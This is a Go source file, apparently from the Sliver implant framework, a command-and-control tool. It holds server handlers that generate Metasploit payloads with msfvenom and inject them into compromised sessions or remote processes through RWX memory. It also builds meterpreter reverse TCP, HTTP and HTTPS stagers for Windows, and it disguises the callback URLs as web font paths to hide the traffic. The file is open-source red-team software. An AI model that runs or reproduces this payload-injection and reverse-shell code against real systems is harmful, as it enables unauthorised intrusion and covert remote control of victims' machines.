package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"math/rand"
	"path"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/server/msf"

	"google.golang.org/protobuf/proto"
)

// Msf - Helper function to execute MSF payloads on the remote system
func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Empty, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	config := msf.VenomConfig{
		Os:         session.Os,
		Arch:       msf.Arch(session.Arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return nil, err
	}
	data, _ := proto.Marshal(&sliverpb.TaskReq{
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
	})
	timeout := rpc.getTimeout(req)
	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
	if err != nil {
		return nil, err
	}
	return &commonpb.Empty{}, nil
}

// MsfRemote - Inject an MSF payload into a remote process
func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*commonpb.Empty, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	config := msf.VenomConfig{
		Os:         session.Os,
		Arch:       msf.Arch(session.Arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		return nil, err
	}
	data, _ := proto.Marshal(&sliverpb.TaskReq{
		Pid:      req.PID,
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
	})
	timeout := rpc.getTimeout(req)
	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
	if err != nil {
		return nil, err
	}
	return &commonpb.Empty{}, nil
}

// MsfStage - Generate a MSF compatible stage
func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
	var (
		MSFStage = &clientpb.MsfStager{
			File: &commonpb.File{},
		}
		payload string
		arch    string
		uri     string
	)

	switch req.GetArch() {
	case "amd64":
		arch = "x64"
	default:
		arch = "x86"
	}

	switch req.Protocol {
	case clientpb.StageProtocol_TCP:
		payload = "meterpreter/reverse_tcp"
	case clientpb.StageProtocol_HTTP:
		payload = "meterpreter/reverse_http"
		uri = generateCallbackURI()
	case clientpb.StageProtocol_HTTPS:
		payload = "meterpreter/reverse_https"
		uri = generateCallbackURI()
	default:
		return MSFStage, fmt.Errorf("Protocol not supported")
	}

	// We only support windows at the moment
	if req.GetOS() != "windows" {
		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
	}

	venomConfig := msf.VenomConfig{
		Os:       req.GetOS(),
		Payload:  payload,
		LHost:    req.GetHost(),
		LPort:    uint16(req.GetPort()),
		Arch:     arch,
		Format:   req.GetFormat(),
		BadChars: req.GetBadChars(), // TODO: make this configurable
		Luri:     uri,
	}

	stage, err := msf.VenomPayload(venomConfig)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return MSFStage, err
	}
	MSFStage.File.Data = stage
	name, err := generate.GetCodename()
	if err != nil {
		return MSFStage, err
	}
	MSFStage.File.Name = name
	return MSFStage, nil
}

// Utility functions
func generateCallbackURI() string {
	segments := []string{"static", "assets", "fonts", "locales"}
	// Randomly picked font while browsing on the web
	fontNames := []string{
		"attribute_text_w01_regular.woff",
		"ZillaSlab-Regular.subset.bbc33fb47cf6.woff",
		"ZillaSlab-Bold.subset.e96c15f68c68.woff",
		"Inter-Regular.woff",
		"Inter-Medium.woff",
	}
	return path.Join(randomPath(segments, fontNames)...)
}

func randomPath(segments []string, filenames []string) []string {
	seed := rand.NewSource(time.Now().UnixNano())
	insecureRand := rand.New(seed)
	n := insecureRand.Intn(3) // How many segements?
	genSegments := []string{}
	for index := 0; index < n; index++ {
		seg := segments[insecureRand.Intn(len(segments))]
		genSegments = append(genSegments, seg)
	}
	filename := filenames[insecureRand.Intn(len(filenames))]
	genSegments = append(genSegments, filename)
	return genSegments
}
